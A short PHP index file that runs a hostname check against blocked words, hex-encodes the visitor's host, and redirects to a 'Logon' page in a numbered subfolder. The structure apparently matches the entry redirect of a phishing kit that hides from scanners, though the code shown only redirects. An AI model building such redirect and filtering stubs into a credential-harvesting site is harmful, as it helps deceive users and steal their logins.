<?php
/*
* index.php
*/
require_once '1/hostname_check.php'; // Check if hostname contain blocked word



$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="1/index.html?$host-$host-$host";

header("location: $Logon");


?>
